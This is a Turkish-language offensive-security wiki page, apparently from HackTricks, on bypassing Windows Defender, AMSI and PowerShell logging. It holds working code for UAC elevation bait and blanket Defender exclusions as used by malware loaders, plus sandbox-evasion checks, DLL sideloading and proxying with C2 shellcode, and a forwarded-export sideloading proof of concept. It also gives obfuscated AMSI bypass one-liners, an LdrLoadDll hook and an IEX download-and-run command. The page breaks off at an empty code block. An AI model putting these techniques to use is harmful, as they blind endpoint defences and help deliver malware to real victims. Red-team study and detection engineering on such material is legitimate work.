# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p)**tarafından yazıldı!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ı çalışmaz hale getiren bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Sahte başka bir AV kullanarak Windows Defender'ı çalışmaz hale getiren bir araç.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Defender'ı değiştirmeden önce installer-style UAC bait

Game cheat gibi davranan public loaders, sıkça imzasız Node.js/Nexe installer olarak gelir ve önce **kullanıcıdan elevation ister**, ardından Defender'ı etkisiz hale getirir. Akış basittir:

1. `net session` ile administrative context kontrol edilir. Bu komut yalnızca çağıran admin yetkilerine sahipse başarılı olur; bu yüzden bir failure, loader'ın standard user olarak çalıştığını gösterir.
2. Beklenen UAC consent prompt'unu tetiklemek için, orijinal command line'ı koruyarak kendisini hemen `RunAs` verb ile yeniden başlatır.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Mağdurlar zaten “cracked” yazılım kurduklarına inanırlar, bu yüzden istem genellikle kabul edilir ve bu da malware’e Defender’ın politikasını değiştirmek için ihtiyaç duyduğu yetkileri verir.

### Her sürücü harfi için blanket `MpPreference` exclusions

Yetki yükseltildikten sonra, GachiLoader tarzı zincirler servisi tamamen devre dışı bırakmak yerine Defender’ın kör noktalarını maksimize eder. Loader önce GUI watchdog’u (`taskkill /F /IM SecHealthUI.exe`) öldürür ve ardından **son derece geniş exclusions** uygular; böylece her user profile, system directory ve removable disk taranamaz hale gelir:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ana gözlemler:

- Döngü, takılı olan tüm filesystem’ler üzerinde gezinir (D:\, E:\, USB sticks, vb.), bu yüzden **disk üzerindeki herhangi bir gelecekte bırakılan payload yok sayılır**.
- `.sys` extension hariç tutması ileriye dönüktür—attackers, Defender’a tekrar dokunmadan sonra imzasız driver’ları yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altına düşer; böylece sonraki aşamalar exclusions’un kalıcı olduğunu doğrulayabilir veya UAC’yi yeniden tetiklemeden bunları genişletebilir.

Hiçbir Defender service durdurulmadığı için, basit health checks hâlâ “antivirus active” raporlar; oysa real-time inspection bu path’lere hiç dokunmaz.

## **AV Evasion Methodology**

Günümüzde AV’ler, bir file’ın malicious olup olmadığını kontrol etmek için farklı yöntemler kullanır: static detection, dynamic analysis ve daha gelişmiş EDR’ler için behavioural analysis.

### **Static detection**

Static detection, binary veya script içindeki bilinen malicious strings ya da byte dizilerini işaretleyerek ve ayrıca file’ın kendisinden bilgi çıkararak gerçekleştirilir (ör. file description, company name, digital signatures, icon, checksum, vb.). Bu, bilinen public tools kullanmanın sizi daha kolay ele vermesi anlamına gelir; çünkü büyük olasılıkla daha önce analiz edilmiş ve malicious olarak işaretlenmişlerdir. Bu tür detection’ı aşmanın birkaç yolu vardır:

- **Encryption**

Binary’yi encrypt ederseniz, AV’nin programınızı detect etmesinin bir yolu kalmaz; ancak programı memory içinde decrypt edip çalıştırmak için bir loader gerekir.

- **Obfuscation**

Bazen tek yapmanız gereken, binary veya script içindeki bazı strings’i değiştirerek AV’yi geçmesini sağlamak olabilir; ancak neyi obfuscate etmeye çalıştığınıza bağlı olarak bu zaman alıcı olabilir.

- **Custom tooling**

Kendi tool’larınızı geliştirirseniz, bilinen kötü signatures olmaz; fakat bu çok zaman ve efor ister.

> [!TIP]
> Windows Defender static detection’a karşı kontrol etmek için iyi bir yol [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)’tir. Temelde file’ı birden fazla segmente böler ve sonra Defender’a her birini tek tek scan ettirir; bu şekilde, binary’nizde hangi strings veya bytes’ın işaretlendiğini tam olarak söyleyebilir.

Pratik AV Evasion hakkında bu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)’ine bakmanızı şiddetle tavsiye ederim.

### **Dynamic analysis**

Dynamic analysis, AV’nin binary’nizi bir sandbox içinde çalıştırıp malicious activity aramasıdır (ör. browser passwords’larını decrypt edip okumaya çalışmak, LSASS üzerinde minidump yapmak, vb.). Bu bölüm biraz daha zor olabilir; fakat sandbox’lardan kaçınmak için yapabilecekleriniz var.

- **Sleep before execution** Bunun nasıl implement edildiğine bağlı olarak, AV’nin dynamic analysis’ini bypass etmek için harika bir yol olabilir. AV’lerin, kullanıcı iş akışını kesmemek için file’ları scan etmek üzere çok kısa bir süresi vardır; bu yüzden uzun sleep’ler binary’lerin analysis’ini bozabilir. Sorun şu ki, birçok AV sandbox’ı, implementasyonuna bağlı olarak sleep’i atlayabilir.
- **Checking machine's resources** Genellikle sandbox’ların kullanabileceği kaynaklar çok azdır (ör. < 2GB RAM); aksi takdirde kullanıcının machine’ini yavaşlatabilirler. Burada oldukça yaratıcı da olabilirsiniz; örneğin CPU sıcaklığını veya fan speed’lerini kontrol etmek gibi, sandbox’ta her şey implement edilmiş olmayacaktır.
- **Machine-specific checks** Eğer workstation’ı "contoso.local" domain’ine joined olan bir user’ı hedeflemek istiyorsanız, bilgisayarın domain’ini kontrol edip belirttiğiniz değerle eşleşip eşleşmediğine bakabilirsiniz; eşleşmiyorsa programınızın exit etmesini sağlayabilirsiniz.

Meğer Microsoft Defender’ın Sandbox computername’i HAL9TH imiş; dolayısıyla detonation’dan önce malware’inizde computer name’i kontrol edebilirsiniz. Eğer isim HAL9TH ile eşleşirse, bunun Defender sandbox’ı içinde olduğunuz anlamına gelir; bu durumda programınızın exit etmesini sağlayabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox’lara karşı [@mgeeky](https://twitter.com/mariuszbit)’den gelen başka bazı gerçekten iyi ipuçları

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Bu yazıda daha önce söylediğimiz gibi, **public tools** sonunda **detected** olur; bu yüzden kendinize şu soruyu sormalısınız:

Örneğin, LSASS dump etmek istiyorsanız, **gerçekten mimikatz kullanmanız gerekir mi**? Yoksa daha az bilinen ve yine LSASS dump eden farklı bir project kullanabilir misiniz?

Doğru cevap muhtemelen ikincisidir. mimikatz’i örnek alırsak, muhtemelen AV’ler ve EDR’ler tarafından en çok işaretlenen malware parçalarından biridir; project’in kendisi çok havalı olsa da, AV’lerden kaçınmak için onunla çalışmak tam bir kabustur. Bu yüzden, elde etmeye çalıştığınız şey için alternatifler arayın.

> [!TIP]
> Evasion için payload’larınızı değiştirirken, defender’da **automatic sample submission** özelliğini kapattığınızdan emin olun ve lütfen, ciddiyim, uzun vadede evasion hedefliyorsanız **VIRUSTOTAL’A YÜKLEMEYİN**. Eğer payload’ınızın belirli bir AV tarafından detect edilip edilmediğini kontrol etmek istiyorsanız, bunu bir VM üzerine kurun, automatic sample submission’ı kapatmaya çalışın ve sonuçtan memnun kalana kadar orada test edin.

## EXEs vs DLLs

Mümkün olan her durumda, evasion için her zaman **DLLs kullanmayı önceliklendirin**; benim deneyimime göre DLL files genellikle **çok daha az detect edilir** ve analiz edilir. Bu da bazı durumlarda detection’dan kaçınmak için çok basit bir tricktir (tabii payload’ınızın DLL olarak çalışabilmenin bir yolu varsa).

Bu resimde görebileceğimiz gibi, Havoc’tan bir DLL Payload antiscan.me üzerinde 4/26 detection rate’e sahipken, EXE payload 7/26 detection rate’e sahiptir.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Şimdi DLL files ile kullanabileceğiniz ve çok daha stealthy olmanızı sağlayacak bazı tricks göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, loader tarafından kullanılan DLL search order’dan yararlanır; victim application ile malicious payload(s)’ı yan yana konumlandırır.

DLL Sideloading’e açık programları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script ile kontrol edebilirsiniz:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut, "C:\Program Files\\" içindeki DLL hijacking’e duyarlı programların listesini ve yüklemeye çalıştıkları DLL dosyalarını çıktılayacaktır.

Kendi başınıza **DLL Hijackable/Sideloadable programları keşfetmenizi** şiddetle tavsiye ederim, bu teknik doğru yapıldığında oldukça gizlidir; ancak herkesçe bilinen DLL Sideloadable programları kullanırsanız, kolayca yakalanabilirsiniz.

Yalnızca bir programın yüklemesini beklediği isimde kötü amaçlı bir DLL yerleştirmek, payload’unuzu yüklemeyecektir; çünkü program bu DLL içinde bazı belirli fonksiyonları bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adı verilen başka bir teknik kullanacağız.

**DLL Proxying**, bir programın proxy (ve kötü amaçlı) DLL üzerinden yaptığı çağrıları orijinal DLL’ye yönlendirir; böylece programın işlevselliği korunur ve payload’unuzun çalıştırılması sağlanır.

[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini [@flangvik](https://twitter.com/Flangvik/) tarafından geliştirilmiş haliyle kullanacağım.

İzlediğim adımlar şunlardı:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Bunlar sonuçlar:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode’umuz ([SGN](https://github.com/EgeBalci/sgn) ile encoded) hem de proxy DLL, [antiscan.me](https://antiscan.me) üzerinde 0/26 Detection rate’e sahip! Buna başarı derdim.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) videosunu DLL Sideloading hakkında ve ayrıca konuştuğumuz şeyleri daha derinlemesine öğrenmek için [ippsec'in videosunu](https://www.youtube.com/watch?v=3eROsG_WNpE) izlemenizi **şiddetle tavsiye ederim**.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules functions export edebilir; bunlar aslında "forwarder"dır: code’a işaret etmek yerine, export entry `TargetDll.TargetFunc` biçiminde bir ASCII string içerir. Bir caller export’u resolve ettiğinde, Windows loader şunu yapar:

- Eğer yüklü değilse `TargetDll` yükle
- Ondan `TargetFunc` resolve et

Anlaşılması gereken temel davranışlar:
- Eğer `TargetDll` bir KnownDLL ise, protected KnownDLLs namespace’inden sağlanır (ör. ntdll, kernelbase, ole32).
- Eğer `TargetDll` bir KnownDLL değilse, normal DLL search order kullanılır; buna forward resolution yapan module’ün dizini de dahildir.

Bu, dolaylı bir sideloading primitive’i sağlar: non-KnownDLL bir module adına forward edilen bir function export eden imzalı bir DLL bulun, sonra bu imzalı DLL’i tam olarak forwarded target module adıyla adlandırılmış attacker-controlled bir DLL ile aynı dizine koyun. Forwarded export çağrıldığında, loader forward’u resolve eder ve DLL’inizi aynı dizinden yükleyip DllMain’inizi çalıştırır.

Windows 11 üzerinde gözlemlenen örnek:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` bir KnownDLL değil, bu yüzden normal arama sırasıyla çözümlenir.

PoC (kopyala-yapıştır):
1) İmzalı sistem DLL'ini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Kod yürütmek için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için forwarded function'ı implemente etmeniz gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) İmzalı bir LOLBin ile forward'u tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Gözlemlenen davranış:
- rundll32 (imzalı) side-by-side `keyiso.dll`’yi yükler (imzalı)
- `KeyIsoSetAuditingInterface` çözümlenirken, loader forward’u `NCRYPTPROV.SetAuditingInterface`’e takip eder
- Loader ardından `C:\test` içinden `NCRYPTPROV.dll`’yi yükler ve `DllMain`’ini çalıştırır
- Eğer `SetAuditingInterface` implement edilmemişse, "missing API" hatasını yalnızca `DllMain` zaten çalıştıktan sonra alırsınız

Hunting ipuçları:
- Hedef modülün bir KnownDLL olmadığı forwarded export’lara odaklanın. KnownDLLs, `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Forwarded export’ları şu gibi tooling ile enumerate edebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder inventory’yi inceleyin: https://hexacorn.com/d/apis_fwd.txt

Detection/defense fikirleri:
- LOLBins’leri (örn. rundll32.exe) system dışı path’lerden signed DLL’leri yüklerken, ardından aynı base name’e sahip non-KnownDLLs’i o directory’den yüklemesini monitor edin
- Şu tür process/module chains için alert üretin: `rundll32.exe` → system dışı `keyiso.dll` → user-writable paths altında `NCRYPTPROV.dll`
- code integrity policies (WDAC/AppLocker) uygulayın ve application directories içinde write+execute erişimini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Freeze’i shellcode’unuzu stealthy bir şekilde load edip execute etmek için kullanabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion sadece bir cat & mouse game’dir, bugün çalışan bir şey yarın tespit edilebilir; bu yüzden asla yalnızca tek bir tool’a güvenme, mümkünse birden fazla evasion tekniğini zincirleme kullanmayı dene.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR’ler sık sık `ntdll.dll` syscall stub’ları üzerinde **user-mode inline hooks** yerleştirir. Bu hook’ları aşmak için, doğru **SSN** (System Service Number) yükleyen ve hook’lu export entrypoint’i çalıştırmadan kernel mode’a geçen **direct** veya **indirect** syscall stub’ları oluşturabilirsin.

**Invocation options:**
- **Direct (embedded)**: oluşturulan stub içine bir `syscall`/`sysenter`/`SVC #0` instruction’ı ekler (`ntdll` export’una dokunmaz).
- **Indirect**: kernel transition’ın `ntdll` içinden geliyormuş gibi görünmesi için mevcut bir `ntdll` içindeki `syscall` gadget’ına atlar (heuristic evasion için faydalı); **randomized indirect** her çağrı için bir havuzdan gadget seçer.
- **Egg-hunt**: diskte statik `0F 05` opcode dizisini gömmekten kaçınır; çalışma zamanında bir syscall sequence çözümleyip bulur.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: stub byte’larını okumak yerine syscall stub’larını virtual address’e göre sıralayarak SSN’leri çıkarır.
- **SyscallsFromDisk**: temiz bir `\KnownDlls\ntdll.dll` map eder, `.text` içinden SSN’leri okur, sonra unmap eder (bellekteki tüm hook’ları aşar).
- **RecycledGate**: stub temizse opcode validation ile VA-sorted SSN inference’ı birleştirir; hooked ise VA inference’a geri döner.
- **HW Breakpoint**: `syscall` instruction’ında DR0 ayarlar ve hooked byte’ları parse etmeden, runtime’da `EAX` içinden SSN’yi yakalamak için bir VEH kullanır.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu, bu yüzden payload'ları bir şekilde **doğrudan in-memory** çalıştırabiliyorsanız, AV bunu engellemek için hiçbir şey yapamazdı; çünkü yeterli görünürlüğe sahip değildi.

AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir.

- User Account Control, veya UAC (EXE, COM, MSI veya ActiveX installation yükseltme)
- PowerShell (scripts, interactive use ve dynamic code evaluation)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA macros

Antivirus çözümlerinin script contents'i şifrelenmemiş ve obfuscated edilmemiş bir formda açığa çıkararak script davranışını incelemesine izin verir.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` çalıştırmak Windows Defender üzerinde şu alert'i üretir.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` eklediğine ve ardından script'in çalıştığı executable'ın path'ini eklediğine dikkat edin; bu durumda powershell.exe

Disk'e hiçbir file bırakmadık, ama yine de AMSI nedeniyle in-memory yakalandık.

Ayrıca, **.NET 4.8** ile birlikte, C# code da AMSI üzerinden çalıştırılır. Bu durum `Assembly.Load(byte[])` ile in-memory execution yüklemeyi bile etkiler. Bu yüzden AMSI'den kaçınmak istiyorsanız, in-memory execution için daha düşük .NET sürümlerini (4.7.2 veya altı gibi) kullanmak önerilir.

AMSI'den kaçınmanın birkaç yolu vardır:

- **Obfuscation**

AMSI esas olarak static detections ile çalıştığından, yüklemeye çalıştığınız script'leri değiştirmek detection'dan kaçınmak için iyi bir yol olabilir.

Ancak AMSI, birden fazla katmanı olsa bile script'leri unobfuscating yapabilme yeteneğine sahiptir, bu yüzden obfuscation nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu da evasion'ı pek basit olmayan hale getirir. Yine de bazen tek yapmanız gereken birkaç variable name değiştirmektir ve işiniz görülür; bu, bir şeyin ne kadar flag edildiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe vb.) process içine bir DLL yüklenerek implemente edildiğinden, unprivileged user olarak çalışırken bile onu kolayca tamper etmek mümkündür. AMSI'nin implemantasyonundaki bu kusur nedeniyle araştırmacılar AMSI scanning'den kaçınmanın birden fazla yolunu bulmuştur.

**Forcing an Error**

AMSI initialization'ı fail olacak şekilde zorlamak (amsiInitFailed), mevcut process için hiçbir scan başlatılmamasına neden olur. Bu ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklanmıştı ve Microsoft daha geniş kullanımını önlemek için bir signature geliştirmiştir.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
AMSI'yi mevcut powershell süreci için kullanılamaz hale getirmek için tek bir powershell kod satırı yeterli oldu. Bu satır elbette AMSI tarafından da işaretlendi, bu yüzden bu tekniği kullanmak için bazı değişiklikler gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) içinden aldığım değiştirilmiş bir AMSI bypass.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi ve amsi.dll içindeki "AmsiScanBuffer" fonksiyonu için address bulup, bunu E_INVALIDARG kodunu döndürecek instructions ile overwrite etmeyi içerir; bu şekilde, gerçek scan sonucunun sonucu 0 olarak döner ve bu da temiz bir sonuç olarak yorumlanır.

> [!TIP]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) okuyun.

Ayrıca powershell ile AMSI bypass etmek için kullanılan birçok başka teknik de vardır, bunlar hakkında daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.

### amsi.dll yüklenmesini engelleyerek AMSI'yi bloklama (LdrLoadDll hook)

AMSI, yalnızca `amsi.dll` mevcut process içine yüklendikten sonra initialise edilir. Sağlam ve dil-agnostic bir bypass, istenen module `amsi.dll` olduğunda error döndüren `ntdll!LdrLoadDll` üzerine user-mode hook yerleştirmektir. Sonuç olarak AMSI hiç yüklenmez ve o process için hiçbir scan gerçekleşmez.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve custom loaders dahil hepsinde çalışır (aksi halde AMSI yükleyecek her şey).
- Uzun command-line artefact’lardan kaçınmak için script’leri stdin üzerinden besleme ile eşleştirin (`PowerShell.exe -NoProfile -NonInteractive -Command -`).
- LOLBins üzerinden çalışan loaders ile kullanıldığı görülmüştür (ör. `regsvr32` ile `DllRegisterServer` çağrısı).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** aracı da AMSI bypass etmek için script üretir.
**[https://amsibypass.com/](https://amsibypass.com/)** aracı da signature’dan kaçınmak için rastgele user-defined function, variables, characters expression kullanan ve PowerShell keywords için rastgele karakter büyük/küçük harf değişimi uygulayan AMSI bypass script’i üretir.

**Tespit edilen signature’ı kaldırın**

**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi bir araç kullanarak tespit edilen AMSI signature’ını mevcut process’in memory’sinden kaldırabilirsiniz. Bu araç, mevcut process’in memory’sini tarayarak AMSI signature’ını bulur ve ardından bunu NOP instructions ile üzerine yazarak memory’den etkili biçimde kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** içinde bulabilirsiniz.

**Powershell version 2 kullanın**
PowerShell version 2 kullanırsanız, AMSI yüklenmez; böylece script’lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging, bir sistemde yürütülen tüm PowerShell komutlarını loglamanıza izin veren bir özelliktir. Bu, denetim ve sorun giderme amaçları için faydalı olabilir, ancak aynı zamanda **tespit edilmekten kaçınmak isteyen saldırganlar için bir problem** de olabilir.

PowerShell logging’i bypass etmek için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging’i devre dışı bırakın**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **Powershell version 2 kullanın**: PowerShell version 2 kullanırsanız, AMSI yüklenmez; böylece scriptlerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şöyle yapabilirsiniz: `powershell.exe -version 2`
- **Unmanaged Powershell Session kullanın**: Defenses olmadan bir powershell başlatmak için [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobal Strike içindeki `powerpick` bunu kullanır).


## Obfuscation

> [!TIP]
> Birçok obfuscation tekniği veriyi encrypt etmeye dayanır; bu da binary’nin entropy değerini artırır ve AV’lerin ve EDR’lerin onu tespit etmesini kolaylaştırır. Buna dikkat edin ve belki de encryption’ı yalnızca kodunuzun sensitive olan veya gizlenmesi gereken belirli bölümlerine uygulayın.

### Deobfuscating ConfuserEx-Protected .NET Binaries

ConfuserEx 2 (veya commercial fork’ları) kullanan malware analiz ederken, decompilers ve sandboxes’ı engelleyen birden fazla protection katmanıyla karşılaşmak yaygındır. Aşağıdaki workflow, sonradan dnSpy veya ILSpy gibi araçlarda C#’a decompile edilebilecek, neredeyse orijinal bir IL’i güvenilir şekilde **geri yükler**.

1.  Anti-tampering removal – ConfuserEx her *method body*’yi encrypt eder ve bunu *module* static constructor (`<Module>.cctor`) içinde decrypt eder. Bu ayrıca PE checksum’ı da patch eder, bu yüzden herhangi bir modification binary’nin crash olmasına neden olur. Encrypted metadata tables’ı bulmak, XOR keys’i kurtarmak ve temiz bir assembly yeniden yazmak için **AntiTamperKiller** kullanın:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output, kendi unpacker’ınızı geliştirirken faydalı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Symbol / control-flow recovery – *clean* dosyayı **de4dot-cex**’e (de4dot’un ConfuserEx-aware bir fork’u) verin.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profilini seçer
• de4dot, control-flow flattening’i geri alır, orijinal namespace’leri, class’ları ve variable isimlerini geri yükler ve constant string’leri decrypt eder.

3.  Proxy-call stripping – ConfuserEx, doğrudan method call’ları decompilation’ı daha da bozmak için hafif wrapper’larla (diğer adıyla *proxy calls*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Bu adımdan sonra `Class8.smethod_10`, … gibi opak wrapper function’lar yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API’leri görmelisiniz.

4.  Manual clean-up – ortaya çıkan binary’yi dnSpy altında çalıştırın, büyük Base64 blob’larını veya gerçek payload’u bulmak için `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Çoğu zaman malware bunu `<Module>.byte_0` içinde initialize edilen TLV-encoded bir byte array olarak saklar.

Yukarıdaki zincir, malicious sample’ı çalıştırmaya gerek kalmadan execution flow’u geri yükler – offline bir workstation üzerinde çalışırken kullanışlıdır.

> 🛈  ConfuserEx, IOC olarak kullanılıp sample’ları otomatik triage etmek için kullanılabilecek `ConfusedByAttribute` adlı özel bir attribute üretir.

#### One-liner
```bash
